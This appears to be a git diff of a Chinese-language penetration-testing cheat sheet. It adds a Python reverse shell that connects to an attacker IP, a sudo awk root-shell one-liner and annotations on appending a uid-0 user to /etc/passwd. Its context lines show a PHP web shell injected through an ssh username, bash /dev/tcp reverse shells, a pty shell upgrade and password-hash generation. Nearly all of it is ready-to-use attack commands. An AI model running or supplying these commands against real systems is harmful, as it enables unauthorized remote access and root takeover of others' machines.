@@ -35,6 +35,8 @@ ssh '<?php @eval($_REQUEST['cmd']);?>'@ip
 
 #### 反弹shell
 
+这里写的是攻击机ip
+
 ###### netcat反弹
 
 ```
@@ -49,6 +51,12 @@ bash -i >& /dev/tcp/192.168.1.106/8888 0>1&
 bash -i >& /dev/tcp/192.168.1.106/8888 0>1& | bash
 ```
 
+###### python反弹
+
+```
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.151.183",1992));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
+```
+
 
 
 ### 提权
@@ -59,11 +67,21 @@ bash -i >& /dev/tcp/192.168.1.106/8888 0>1& | bash
 
 看看有哪些权限
 
-###### 升级tty shell
+###### python升级tty shell
 
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
+
+
+
+###### awk提权
+
+```
+sudo awk 'BEGIN {system("/bin/bash")}'
+```
+
+
 
 ###### capabilities提权
 
@@ -75,7 +93,7 @@ CAP_DAC_READ_SEARCH 忽略文件读及目录搜索的 DAC 访问限制
 
 ###### /etc/passwd提权
 
-构造一个用户 uid设置为0
+构造一个用户 uid设置为0 因为root的uid为0
 
 ```
 #利用openssl生成加密的密码, 语法：openssl passwd-1-salt[salt value]password
@@ -89,13 +107,14 @@ python -c 'import crypt; print crypt.crypt("pass", "$6$salt")'
  
 #利用Perl和crypt来使用salt值为我们的密码生成哈希值
 perl -le 'print crypt("test","addedsalt")'
+这里把test转换为密码
  
 #php语言
 php -r "print(crypt('aarti','123') . " ");"
 
 
-echo "test:adMpHktIn0tR2:0:0:User_like_root:/root:/bin/bash" >>/etc/passwd
-
+echo的第一个是自己设置的用户名 冒号后面的是生成的哈希密码
+echo "test:adMpHktIn0tR2:0:0:root:/root:/bin/bash" >>/etc/passwd
 
 ```
 
